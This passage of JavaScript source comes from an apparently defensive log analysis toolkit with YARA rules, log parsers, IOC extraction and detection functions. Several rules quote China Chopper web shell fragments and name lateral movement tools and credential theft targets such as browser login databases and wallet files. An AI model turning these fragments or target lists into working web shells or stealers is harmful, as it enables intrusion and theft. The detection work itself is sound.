        $s7 = "reverse" ascii nocase
        $s8 = "process.env" ascii
    condition:
        any of ($pre*) and 2 of ($s*)
}`
  },
  {
    name: 'Emotet_Dropper',
    description: 'Detects Emotet malware dropper patterns.',
    rule: `rule Emotet_Dropper {
    meta:
        description = "Detects Emotet dropper patterns"
        author = "Darknode"
        severity = "critical"
    strings:
        $s1 = "WScript.Shell" ascii nocase
        $s2 = "Scripting.FileSystemObject" ascii nocase
        $s3 = "MSXML2.XMLHTTP" ascii nocase
        $s4 = "Wscript.Sleep" ascii nocase
        $s5 = "CreateObject" ascii nocase
        $s6 = "RegWrite" ascii nocase
        $s7 = "powershell" ascii nocase
        $s8 = "hidden" ascii nocase
        $s9 = ".Run" ascii
    condition:
        5 of them
}`
  },
  {
    name: 'Webshell_China_Chopper',
    description: 'Detects China Chopper web shell.',
    rule: `rule Webshell_China_Chopper {
    meta:
        description = "Detects China Chopper web shell"
        author = "Darknode"
        severity = "critical"
    strings:
        $php1 = "<?php @eval($_POST[" ascii
        $php2 = "<?php @assert($_POST[" ascii
        $asp1 = "<%eval request(" ascii nocase
        $asp2 = "<%execute request(" ascii nocase
        $aspx1 = "eval(Request.Item[" ascii nocase
        $jsp1 = "Runtime.getRuntime().exec(request.getParameter" ascii
    condition:
        any of them
}`
  },
  {
    name: 'Persistence_Autorun',
    description: 'Detects files that attempt to establish persistence via autorun.',
    rule: `rule Persistence_Autorun {
    meta:
        description = "Detects autorun persistence patterns"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "CurrentVersion\\\\Run" ascii nocase
        $s2 = "CurrentVersion\\\\RunOnce" ascii nocase
        $s3 = "Startup" ascii nocase
        $s4 = "HKLM\\\\SOFTWARE" ascii nocase
        $s5 = "HKCU\\\\SOFTWARE" ascii nocase
        $s6 = "RegSetValueEx" ascii
        $s7 = "autorun.inf" ascii nocase
        $s8 = "shell:startup" ascii nocase
        $s9 = "schtasks" ascii nocase
        $s10 = "sc create" ascii nocase
    condition:
        3 of them
}`
  },
  {
    name: 'Anti_Analysis_Techniques',
    description: 'Detects anti-analysis and anti-debugging techniques.',
    rule: `rule Anti_Analysis_Techniques {
    meta:
        description = "Detects anti-analysis evasion techniques"
        author = "Darknode"
        severity = "medium"
    strings:
        $s1 = "IsDebuggerPresent" ascii
        $s2 = "CheckRemoteDebuggerPresent" ascii
        $s3 = "NtQueryInformationProcess" ascii
        $s4 = "OutputDebugString" ascii
        $s5 = "VirtualBox" ascii nocase
        $s6 = "VMware" ascii nocase
        $s7 = "QEMU" ascii nocase
        $s8 = "Sandboxie" ascii nocase
        $s9 = "wine_get_unix_file_name" ascii
        $s10 = "SbieDll" ascii
        $s11 = "DbgUiRemoteBreakin" ascii
        $s12 = "GetTickCount" ascii
        $s13 = "QueryPerformanceCounter" ascii
    condition:
        uint16(0) == 0x5A4D and 4 of them
}`
  },
  {
    name: 'Lateral_Movement_Tool',
    description: 'Detects lateral movement tool indicators.',
    rule: `rule Lateral_Movement_Tool {
    meta:
        description = "Detects lateral movement tool patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "psexec" ascii nocase
        $s2 = "wmiexec" ascii nocase
        $s3 = "smbexec" ascii nocase
        $s4 = "atexec" ascii nocase
        $s5 = "dcomexec" ascii nocase
        $s6 = "impacket" ascii nocase
        $s7 = "CrackMapExec" ascii nocase
        $s8 = "evil-winrm" ascii nocase
        $s9 = "pth-winexe" ascii nocase
        $s10 = "secretsdump" ascii nocase
    condition:
        any of them
}`
  },
  {
    name: 'Information_Stealer',
    description: 'Detects information stealer malware patterns.',
    rule: `rule Information_Stealer {
    meta:
        description = "Detects info stealer patterns"
        author = "Darknode"
        severity = "high"
    strings:
        $s1 = "wallet.dat" ascii nocase
        $s2 = "cookies.sqlite" ascii nocase
        $s3 = "Web Data" ascii
        $s4 = "formhistory.sqlite" ascii nocase
        $s5 = "autofill" ascii nocase
        $s6 = "credit_cards" ascii nocase
        $s7 = "passwords" ascii nocase
        $s8 = "keychain" ascii nocase
        $s9 = "Cookies" ascii
        $s10 = "Login Data" ascii
    condition:
        4 of them
}`
  },
];

/* ============================================================
   SECTION 2: PARSING FUNCTIONS
   ============================================================ */

function parseApacheAccess(text) {
  const lines = text.split('\n').filter(l => l.trim());
  const results = [];
  for (const line of lines) {
    let m = APACHE_COMBINED_RE.exec(line);
    if (m) {
      results.push({
        ip: m[1], ident: m[2], user: m[3], timestamp: m[4],
        method: m[5], url: m[6], protocol: m[7],
        status: parseInt(m[8], 10), bytes: m[9] === '-' ? 0 : parseInt(m[9], 10),
        referer: m[10], useragent: m[11], raw: line
      });
      continue;
    }
    m = APACHE_COMMON_RE.exec(line);
    if (m) {
      results.push({
        ip: m[1], ident: m[2], user: m[3], timestamp: m[4],
        method: m[5], url: m[6], protocol: m[7],
        status: parseInt(m[8], 10), bytes: m[9] === '-' ? 0 : parseInt(m[9], 10),
        referer: '', useragent: '', raw: line
      });
    }
  }
  return results;
}

function parseApacheError(text) {
  const lines = text.split('\n').filter(l => l.trim());
  const results = [];
  for (const line of lines) {
    let m = APACHE_ERROR_RE.exec(line);
    if (!m) m = NGINX_ERROR_RE.exec(line);
    if (m) {
      results.push({
        timestamp: m[1],
        level: m[2],
        extra: m[3] || '',
        message: m[4] || m[5] || '',
        raw: line
      });
    } else {
      results.push({ timestamp: '', level: 'unknown', extra: '', message: line, raw: line });
    }
  }
  return results;
}

function parseAuthLog(text) {
  const lines = text.split('\n').filter(l => l.trim());
  const entries = [];
  for (const line of lines) {
    const isFailed = AUTH_FAILED_RE.test(line);
    const isSuccess = AUTH_SUCCESS_RE.test(line);
    const isSudo = SUDO_RE.test(line);
    const ips = line.match(IPV4_RE) || [];
    const userMatch = line.match(/(?:for|user[= ])(\S+)/i);
    entries.push({
      raw: line,
      type: isFailed ? 'failed' : isSuccess ? 'success' : isSudo ? 'sudo' : 'other',
      ip: ips[0] || '',
      user: userMatch ? userMatch[1] : '',
      isBrute: isFailed
    });
  }
  return entries;
}

function detectBruteForce(entries, threshold = 5) {
  const ipCounts = {};
  for (const e of entries) {
    if (e.type === 'failed' && e.ip) {
      ipCounts[e.ip] = (ipCounts[e.ip] || 0) + 1;
    }
  }
  const suspects = [];
  for (const [ip, count] of Object.entries(ipCounts)) {
    if (count >= threshold) suspects.push({ ip, count });
  }
  return suspects.sort((a, b) => b.count - a.count);
}

function parseSyslog(text) {
  const lines = text.split('\n').filter(l => l.trim());
  const results = [];
  for (const line of lines) {
    let m = SYSLOG_RFC5424_RE.exec(line);
    if (m) {
      const pri = parseInt(m[1], 10);
      results.push({
        facility: SYSLOG_FACILITIES[Math.floor(pri / 8)] || 'unknown',
        severity: SYSLOG_SEVERITIES[pri % 8] || 'unknown',
        version: m[2], timestamp: m[3], hostname: m[4],
        appname: m[5], procid: m[6], msgid: m[7],
        structured: m[8] || '', message: m[9] || '', raw: line, format: 'RFC5424'
      });
      continue;
    }
    m = SYSLOG_RFC3164_RE.exec(line);
    if (m) {
      const pri = parseInt(m[1], 10);
      results.push({
        facility: SYSLOG_FACILITIES[Math.floor(pri / 8)] || 'unknown',
        severity: SYSLOG_SEVERITIES[pri % 8] || 'unknown',
        version: '', timestamp: m[2], hostname: m[3],
        appname: m[4], procid: m[5] || '', msgid: '',
        structured: '', message: m[6], raw: line, format: 'RFC3164'
      });
      continue;
    }
    results.push({
      facility: 'unknown', severity: 'unknown', version: '', timestamp: '',
      hostname: '', appname: '', procid: '', msgid: '',
      structured: '', message: line, raw: line, format: 'unknown'
    });
  }
  return results;
}

function parseJSON(text) {
  const results = [];
  const lines = text.split('\n').filter(l => l.trim());
  for (const line of lines) {
    try {
      results.push(JSON.parse(line));
    } catch (e) {
      // try entire text as JSON
    }
  }
  if (results.length === 0) {
    try {
      const parsed = JSON.parse(text);
      if (Array.isArray(parsed)) return parsed;
      return [parsed];
    } catch (e) {
      return [];
    }
  }
  return results;
}

function extractIOCs(text) {
  const ips4 = [...new Set((text.match(IPV4_RE) || []))];
  const ips6 = [...new Set((text.match(IPV6_RE) || []))];
  const domains = [...new Set((text.match(DOMAIN_RE) || []))].filter(d => {
    const tld = d.split('.').pop().toLowerCase();
    return !['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'].includes(tld);
  });
  const urls = [...new Set((text.match(URL_RE) || []))];
  const emails = [...new Set((text.match(EMAIL_RE) || []))];
  const md5s = [...new Set((text.match(MD5_RE) || []))].filter(h => !/^[0-9]+$/.test(h));
  const sha1s = [...new Set((text.match(SHA1_RE) || []))].filter(h => !/^[0-9]+$/.test(h));
  const sha256s = [...new Set((text.match(SHA256_RE) || []))].filter(h => !/^[0-9]+$/.test(h));
  return { ips4, ips6, domains, urls, emails, md5s, sha1s, sha256s };
}

function countIPFrequency(text) {
  const ips = text.match(IPV4_RE) || [];
  const freq = {};
  for (const ip of ips) {
    freq[ip] = (freq[ip] || 0) + 1;
  }
  return Object.entries(freq)
    .map(([ip, count]) => ({ ip, count }))
    .sort((a, b) => b.count - a.count);
}

function classifyUserAgent(ua) {
  for (const entry of KNOWN_USER_AGENTS) {
    if (entry.pattern.test(ua)) {
      return { label: entry.label, category: entry.category };
    }
  }
  if (/bot|crawler|spider|scraper/i.test(ua)) {
    return { label: 'Unknown Bot/Crawler', category: 'bot' };
  }
  return { label: 'Unknown', category: 'unknown' };
}

function detectPatterns(entries) {
  const findings = [];
  // Burst detection: more than 10 entries from same IP within what appears sequential
  const ipSequences = {};
  for (let i = 0; i < entries.length; i++) {
    const ip = entries[i].ip;
    if (!ip) continue;
    if (!ipSequences[ip]) ipSequences[ip] = [];
    ipSequences[ip].push(i);
  }
  for (const [ip, indices] of Object.entries(ipSequences)) {
    if (indices.length >= 20) {
      findings.push({
        type: 'burst',
        severity: 'medium',
        message: `High activity from ${ip}: ${indices.length} requests detected`,
        ip
      });
    }
  }
  // Scanning detection: same IP hitting many different URLs
  const ipUrls = {};
  for (const e of entries) {
    if (e.ip && e.url) {
      if (!ipUrls[e.ip]) ipUrls[e.ip] = new Set();
      ipUrls[e.ip].add(e.url);
    }
  }
  for (const [ip, urls] of Object.entries(ipUrls)) {
    if (urls.size >= 50) {
      findings.push({
        type: 'scanning',
        severity: 'high',
        message: `Potential scanning from ${ip}: ${urls.size} unique URLs accessed`,
        ip
      });
    }
  }
  // Error rate detection
  const ipErrors = {};
  for (const e of entries) {
    if (e.ip && e.status >= 400) {
      ipErrors[e.ip] = (ipErrors[e.ip] || 0) + 1;
    }
  }
  for (const [ip, count] of Object.entries(ipErrors)) {
    if (count >= 20) {
      findings.push({
        type: 'errors',
        severity: 'medium',
        message: `High error rate from ${ip}: ${count} error responses`,
        ip
      });
    }
  }
  // Path traversal detection
  for (const e of entries) {
    if (e.url && /(\.\.|%2e%2e|%252e)/i.test(e.url)) {
      findings.push({
        type: 'traversal',
        severity: 'high',
        message: `Path traversal attempt from ${e.ip}: ${e.url}`,
        ip: e.ip
      });
    }
  }
  // SQLi detection
  for (const e of entries) {
    if (e.url && /('|%27|union\s+select|or\s+1\s*=\s*1|;\s*drop|--\s*$)/i.test(e.url)) {
      findings.push({
        type: 'sqli',
        severity: 'critical',
        message: `Potential SQL injection from ${e.ip}: ${e.url.substring(0, 120)}`,
        ip: e.ip
      });
    }
  }
  // XSS detection
  for (const e of entries) {
    if (e.url && /<script|javascript:|onerror\s*=|onload\s*=/i.test(decodeURIComponent(e.url))) {
      findings.push({
        type: 'xss',
        severity: 'high',
        message: `Potential XSS attempt from ${e.ip}: ${e.url.substring(0, 120)}`,
        ip: e.ip
      });
    }
  }
  return findings;
}

function buildTimeline(entries) {
  // Build an ASCII timeline from log entries
  const hours = new Array(24).fill(0);
  for (const e of entries) {
    const ts = e.timestamp || '';
    const hMatch = ts.match(/(\d{2}):\d{2}:\d{2}/);
    if (hMatch) {
      hours[parseInt(hMatch[1], 10)]++;
    }
  }
  const maxCount = Math.max(...hours, 1);
  const barWidth = 40;
  let output = 'Activity Timeline (by hour of day)\n';
  output += '=' .repeat(60) + '\n';
  for (let h = 0; h < 24; h++) {
    const label = String(h).padStart(2, '0') + ':00';
    const barLen = Math.round((hours[h] / maxCount) * barWidth);
    const bar = '#'.repeat(barLen);
    output += `${label} |${bar.padEnd(barWidth)}| ${hours[h]}\n`;
  }
  output += '=' .repeat(60) + '\n';
  output += `Total entries: ${entries.length} | Peak hour: ${String(hours.indexOf(Math.max(...hours))).padStart(2, '0')}:00\n`;
  return output;
}

function escapeHTML(s) {
  return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

/* ============================================================
   SECTION 3: REGEX BUILDER PRESETS
   ============================================================ */

const REGEX_PRESETS = [
  { name: 'IPv4 Address', pattern: '\\b(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\b', description: 'Matches valid IPv4 addresses' },
  { name: 'IPv6 Address', pattern: '\\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\\b', description: 'Matches IPv6 addresses (simplified)' },
  { name: 'Email Address', pattern: '\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b', description: 'Matches email addresses' },
  { name: 'URL', pattern: 'https?://[^\\s"\'<>]+', description: 'Matches HTTP/HTTPS URLs' },
  { name: 'MD5 Hash', pattern: '\\b[a-fA-F0-9]{32}\\b', description: 'Matches MD5 hashes' },
  { name: 'SHA1 Hash', pattern: '\\b[a-fA-F0-9]{40}\\b', description: 'Matches SHA1 hashes' },
  { name: 'SHA256 Hash', pattern: '\\b[a-fA-F0-9]{64}\\b', description: 'Matches SHA256 hashes' },
  { name: 'MAC Address', pattern: '\\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\\b', description: 'Matches MAC addresses' },
  { name: 'Date (YYYY-MM-DD)', pattern: '\\d{4}-(?:0[1-9]|1[0-2])-(?:0[1-9]|[12]\\d|3[01])', description: 'Matches ISO date format' },
  { name: 'Date (DD/Mon/YYYY)', pattern: '(?:0[1-9]|[12]\\d|3[01])/(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)/\\d{4}', description: 'Matches Apache date format' },
  { name: 'Timestamp (HH:MM:SS)', pattern: '(?:[01]\\d|2[0-3]):[0-5]\\d:[0-5]\\d', description: 'Matches time in HH:MM:SS format' },
  { name: 'Windows Path', pattern: '[A-Z]:\\\\(?:[^\\\\/:*?"<>|\\r\\n]+\\\\)*[^\\\\/:*?"<>|\\r\\n]*', description: 'Matches Windows file paths' },
  { name: 'Unix Path', pattern: '(?:/[a-zA-Z0-9._-]+)+/?', description: 'Matches Unix file paths' },
  { name: 'Domain Name', pattern: '\\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,}\\b', description: 'Matches domain names' },
  { name: 'Port Number', pattern: '\\b(?:6553[0-5]|655[0-2]\\d|65[0-4]\\d{2}|6[0-4]\\d{3}|[1-5]\\d{4}|[1-9]\\d{0,3})\\b', description: 'Matches valid port numbers (1-65535)' },
  { name: 'HTTP Status Code', pattern: '\\b[1-5]\\d{2}\\b', description: 'Matches HTTP status codes' },
  { name: 'Apache Combined Log', pattern: '^(\\S+) (\\S+) (\\S+) \\[([^\\]]+)\\] "(\\S+) (\\S+) ([^"]*)" (\\d{3}) (\\d+|-) "([^"]*)" "([^"]*)"', description: 'Matches Apache combined log format' },
  { name: 'Syslog RFC 3164', pattern: '^<(\\d+)>(\\w{3}\\s+\\d+\\s+\\d{2}:\\d{2}:\\d{2}) (\\S+) (\\S+?)(?:\\[(\\d+)\\])?: (.+)', description: 'Matches RFC 3164 syslog format' },
  { name: 'Base64 String', pattern: '(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?', description: 'Matches base64 encoded strings' },
  { name: 'Credit Card Number', pattern: '\\b(?:\\d[ -]*?){13,16}\\b', description: 'Matches potential credit card numbers' },
  { name: 'SSN Pattern', pattern: '\\b\\d{3}-\\d{2}-\\d{4}\\b', description: 'Matches US Social Security Number format' },
  { name: 'CVE Identifier', pattern: 'CVE-\\d{4}-\\d{4,}', description: 'Matches CVE identifiers' },
  { name: 'JWT Token', pattern: 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+', description: 'Matches JWT tokens' },
  { name: 'AWS Access Key', pattern: '(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}', description: 'Matches AWS access key IDs' },
  { name: 'Private Key Header', pattern: '-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----', description: 'Matches PEM private key headers' },
];

/* ============================================================
   SECTION 4: UI TAB RENDERING FUNCTIONS
   ============================================================ */

function renderApacheAccessTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Apache/Nginx Access Log Parser</h2>
    <p class="muted">Paste Apache Combined/Common or Nginx access log entries below. The parser extracts IPs, URLs, status codes, user agents, bytes transferred, and timestamps.</p>
    <textarea class="tk-in" id="la-apache-input" rows="10" placeholder="Paste access log lines here...
Example:
192.168.1.100 - admin [10/Oct/2024:13:55:36 -0700] &quot;GET /admin/config HTTP/1.1&quot; 200 2326 &quot;http://example.com/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;
10.0.0.50 - - [10/Oct/2024:13:55:37 -0700] &quot;POST /login HTTP/1.1&quot; 401 534 &quot;-&quot; &quot;sqlmap/1.6&quot;"></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-apache-parse">Parse Logs</button>
      <button class="btn sm" id="la-apache-summary">Summary Stats</button>
      <button class="btn sm" id="la-apache-ips">Extract IPs</button>
      <button class="btn sm" id="la-apache-urls">Top URLs</button>
      <button class="btn sm" id="la-apache-status">Status Codes</button>
      <button class="btn sm" id="la-apache-ua">User Agents</button>
      <button class="btn sm" id="la-apache-timeline">Timeline</button>
      <button class="btn sm" id="la-apache-detect">Detect Patterns</button>
    </div>
    <pre class="tk-out" id="la-apache-output"></pre>
  `;
  const inp = container.querySelector('#la-apache-input');
  const out = container.querySelector('#la-apache-output');

  container.querySelector('#la-apache-parse').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    if (entries.length === 0) { out.textContent = 'No valid log entries found. Check the format.'; return; }
    let result = `Parsed ${entries.length} log entries:\n${'='.repeat(80)}\n\n`;
    for (const e of entries.slice(0, 100)) {
      result += `IP: ${e.ip} | ${e.method} ${e.url} | Status: ${e.status} (${HTTP_STATUS_MAP[e.status] || 'Unknown'}) | ${e.bytes} bytes\n`;
      if (e.useragent) result += `  UA: ${e.useragent}\n`;
      result += `  Time: ${e.timestamp}\n\n`;
    }
    if (entries.length > 100) result += `... and ${entries.length - 100} more entries.\n`;
    out.textContent = result;
  };

  container.querySelector('#la-apache-summary').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    if (entries.length === 0) { out.textContent = 'No valid log entries found.'; return; }
    const uniqueIPs = new Set(entries.map(e => e.ip));
    const uniqueURLs = new Set(entries.map(e => e.url));
    const methods = {};
    const statusGroups = { '2xx': 0, '3xx': 0, '4xx': 0, '5xx': 0, 'other': 0 };
    let totalBytes = 0;
    for (const e of entries) {
      methods[e.method] = (methods[e.method] || 0) + 1;
      totalBytes += e.bytes;
      if (e.status >= 200 && e.status < 300) statusGroups['2xx']++;
      else if (e.status >= 300 && e.status < 400) statusGroups['3xx']++;
      else if (e.status >= 400 && e.status < 500) statusGroups['4xx']++;
      else if (e.status >= 500) statusGroups['5xx']++;
      else statusGroups['other']++;
    }
    let result = `ACCESS LOG SUMMARY\n${'='.repeat(60)}\n\n`;
    result += `Total Entries:  ${entries.length}\n`;
    result += `Unique IPs:     ${uniqueIPs.size}\n`;
    result += `Unique URLs:    ${uniqueURLs.size}\n`;
    result += `Total Bytes:    ${(totalBytes / 1024 / 1024).toFixed(2)} MB\n\n`;
    result += `HTTP Methods:\n`;
    for (const [m, c] of Object.entries(methods).sort((a, b) => b[1] - a[1])) {
      result += `  ${m.padEnd(8)} ${c} (${(c / entries.length * 100).toFixed(1)}%)\n`;
    }
    result += `\nStatus Code Groups:\n`;
    for (const [g, c] of Object.entries(statusGroups)) {
      if (c > 0) result += `  ${g.padEnd(8)} ${c} (${(c / entries.length * 100).toFixed(1)}%)\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-apache-ips').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    const freq = countIPFrequency(entries.map(e => e.ip).join('\n'));
    let result = `IP ADDRESS FREQUENCY\n${'='.repeat(60)}\n\n`;
    result += `${'IP Address'.padEnd(20)} ${'Count'.padEnd(10)} ${'Percent'.padEnd(10)} Bar\n`;
    result += `${'-'.repeat(20)} ${'-'.repeat(10)} ${'-'.repeat(10)} ${'-'.repeat(20)}\n`;
    const maxC = freq.length > 0 ? freq[0].count : 1;
    for (const { ip, count } of freq) {
      const pct = (count / entries.length * 100).toFixed(1);
      const bar = '#'.repeat(Math.round(count / maxC * 20));
      result += `${ip.padEnd(20)} ${String(count).padEnd(10)} ${(pct + '%').padEnd(10)} ${bar}\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-apache-urls').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    const urlCounts = {};
    for (const e of entries) {
      urlCounts[e.url] = (urlCounts[e.url] || 0) + 1;
    }
    const sorted = Object.entries(urlCounts).sort((a, b) => b[1] - a[1]);
    let result = `TOP URLs\n${'='.repeat(80)}\n\n`;
    for (const [url, count] of sorted.slice(0, 50)) {
      result += `${String(count).padStart(6)} | ${url}\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-apache-status').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    const statusCounts = {};
    for (const e of entries) {
      statusCounts[e.status] = (statusCounts[e.status] || 0) + 1;
    }
    const sorted = Object.entries(statusCounts).sort((a, b) => a[0] - b[0]);
    let result = `STATUS CODE DISTRIBUTION\n${'='.repeat(60)}\n\n`;
    for (const [status, count] of sorted) {
      const desc = HTTP_STATUS_MAP[parseInt(status)] || 'Unknown';
      const pct = (count / entries.length * 100).toFixed(1);
      const bar = '#'.repeat(Math.round(count / entries.length * 40));
      result += `${status} ${desc.padEnd(25)} ${String(count).padStart(6)} (${pct}%) ${bar}\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-apache-ua').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    const uaCounts = {};
    for (const e of entries) {
      if (e.useragent) uaCounts[e.useragent] = (uaCounts[e.useragent] || 0) + 1;
    }
    const sorted = Object.entries(uaCounts).sort((a, b) => b[1] - a[1]);
    let result = `USER AGENT ANALYSIS\n${'='.repeat(80)}\n\n`;
    for (const [ua, count] of sorted.slice(0, 30)) {
      const cls = classifyUserAgent(ua);
      const flag = cls.category === 'attack-tool' ? ' [ATTACK TOOL]' : cls.category === 'bot' ? ' [BOT]' : '';
      result += `Count: ${count}${flag}\n  Category: ${cls.label}\n  UA: ${ua}\n\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-apache-timeline').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    out.textContent = buildTimeline(entries);
  };

  container.querySelector('#la-apache-detect').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    if (entries.length === 0) { out.textContent = 'No valid log entries found.'; return; }
    const findings = detectPatterns(entries);
    if (findings.length === 0) {
      out.textContent = 'No suspicious patterns detected in the provided logs.';
      return;
    }
    let result = `PATTERN DETECTION RESULTS\n${'='.repeat(60)}\n\n`;
    result += `Found ${findings.length} suspicious patterns:\n\n`;
    const bySev = { critical: [], high: [], medium: [], low: [] };
    for (const f of findings) (bySev[f.severity] || []).push(f);
    for (const sev of ['critical', 'high', 'medium', 'low']) {
      if (bySev[sev].length === 0) continue;
      result += `--- ${sev.toUpperCase()} ---\n`;
      for (const f of bySev[sev]) {
        result += `  [${f.type.toUpperCase()}] ${f.message}\n`;
      }
      result += '\n';
    }
    out.textContent = result;
  };
}

function renderErrorLogTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Apache/Nginx Error Log Parser</h2>
    <p class="muted">Paste Apache or Nginx error log entries. The parser extracts timestamps, severity levels, and error messages, with severity classification.</p>
    <textarea class="tk-in" id="la-error-input" rows="10" placeholder="Paste error log lines here...
Example:
[Wed Oct 11 14:32:52 2024] [error] [client 192.168.1.100] File does not exist: /var/www/html/admin
2024/10/11 14:32:52 [error] 1234#0: *5678 open() &quot;/usr/share/nginx/html/wp-login.php&quot; failed"></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-error-parse">Parse</button>
      <button class="btn sm" id="la-error-severity">By Severity</button>
    </div>
    <pre class="tk-out" id="la-error-output"></pre>
  `;
  const inp = container.querySelector('#la-error-input');
  const out = container.querySelector('#la-error-output');

  container.querySelector('#la-error-parse').onclick = () => {
    const entries = parseApacheError(inp.value);
    if (entries.length === 0) { out.textContent = 'No entries parsed.'; return; }
    let result = `Parsed ${entries.length} error log entries:\n${'='.repeat(80)}\n\n`;
    for (const e of entries) {
      result += `[${e.level.toUpperCase()}] ${e.timestamp}\n  ${e.message}\n\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-error-severity').onclick = () => {
    const entries = parseApacheError(inp.value);
    const byLevel = {};
    for (const e of entries) {
      const lev = e.level.toLowerCase();
      byLevel[lev] = (byLevel[lev] || 0) + 1;
    }
    let result = `ERROR SEVERITY DISTRIBUTION\n${'='.repeat(60)}\n\n`;
    for (const [level, count] of Object.entries(byLevel).sort((a, b) => b[1] - a[1])) {
      result += `${level.toUpperCase().padEnd(15)} ${count}\n`;
    }
    out.textContent = result;
  };
}

function renderAuthLogTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Authentication Log Analyzer</h2>
    <p class="muted">Paste auth.log / secure log entries. Detects brute force attempts, successful logins, sudo usage, and account lockouts.</p>
    <textarea class="tk-in" id="la-auth-input" rows="10" placeholder="Paste auth log lines here...
Example:
Oct 11 14:32:52 server sshd[12345]: Failed password for root from 192.168.1.100 port 22 ssh2
Oct 11 14:32:55 server sshd[12346]: Accepted password for admin from 10.0.0.5 port 22 ssh2
Oct 11 14:33:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash"></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-auth-parse">Parse All</button>
      <button class="btn sm" id="la-auth-brute">Detect Brute Force</button>
      <button class="btn sm" id="la-auth-success">Successful Logins</button>
      <button class="btn sm" id="la-auth-sudo">Sudo Events</button>
      <button class="btn sm" id="la-auth-failed">Failed Attempts</button>
    </div>
    <div class="tk-row" style="margin:8px 0">
      <label class="muted">Brute force threshold: </label>
      <input class="tk-f" id="la-auth-threshold" type="number" value="5" min="1" max="1000" style="width:80px">
    </div>
    <pre class="tk-out" id="la-auth-output"></pre>
  `;
  const inp = container.querySelector('#la-auth-input');
  const out = container.querySelector('#la-auth-output');

  container.querySelector('#la-auth-parse').onclick = () => {
    const entries = parseAuthLog(inp.value);
    if (entries.length === 0) { out.textContent = 'No entries found.'; return; }
    const counts = { failed: 0, success: 0, sudo: 0, other: 0 };
    for (const e of entries) counts[e.type]++;
    let result = `AUTH LOG ANALYSIS\n${'='.repeat(60)}\n\n`;
    result += `Total Entries:     ${entries.length}\n`;
    result += `Failed Auth:       ${counts.failed}\n`;
    result += `Successful Auth:   ${counts.success}\n`;
    result += `Sudo Events:       ${counts.sudo}\n`;
    result += `Other:             ${counts.other}\n\n`;
    result += `--- Entries ---\n\n`;
    for (const e of entries.slice(0, 100)) {
      const tag = e.type === 'failed' ? '[FAILED]' : e.type === 'success' ? '[SUCCESS]' : e.type === 'sudo' ? '[SUDO]' : '[OTHER]';
      result += `${tag} ${e.user ? 'User: ' + e.user + ' ' : ''}${e.ip ? 'IP: ' + e.ip + ' ' : ''}\n  ${e.raw}\n\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-auth-brute').onclick = () => {
    const entries = parseAuthLog(inp.value);
    const threshold = parseInt(container.querySelector('#la-auth-threshold').value, 10) || 5;
    const suspects = detectBruteForce(entries, threshold);
    if (suspects.length === 0) {
      out.textContent = `No brute force activity detected (threshold: ${threshold} failed attempts per IP).`;
      return;
    }
    let result = `BRUTE FORCE DETECTION (threshold: ${threshold})\n${'='.repeat(60)}\n\n`;
    result += `Found ${suspects.length} suspicious source IPs:\n\n`;
    for (const s of suspects) {
      result += `  ${s.ip.padEnd(20)} ${s.count} failed attempts\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-auth-success').onclick = () => {
    const entries = parseAuthLog(inp.value).filter(e => e.type === 'success');
    if (entries.length === 0) { out.textContent = 'No successful logins found.'; return; }
    let result = `SUCCESSFUL LOGINS\n${'='.repeat(60)}\n\n`;
    for (const e of entries) {
      result += `User: ${e.user || 'unknown'} | IP: ${e.ip || 'unknown'}\n  ${e.raw}\n\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-auth-sudo').onclick = () => {
    const entries = parseAuthLog(inp.value).filter(e => e.type === 'sudo');
    if (entries.length === 0) { out.textContent = 'No sudo events found.'; return; }
    let result = `SUDO EVENTS\n${'='.repeat(60)}\n\n`;
    for (const e of entries) {
      result += `${e.raw}\n\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-auth-failed').onclick = () => {
    const entries = parseAuthLog(inp.value).filter(e => e.type === 'failed');
    if (entries.length === 0) { out.textContent = 'No failed attempts found.'; return; }
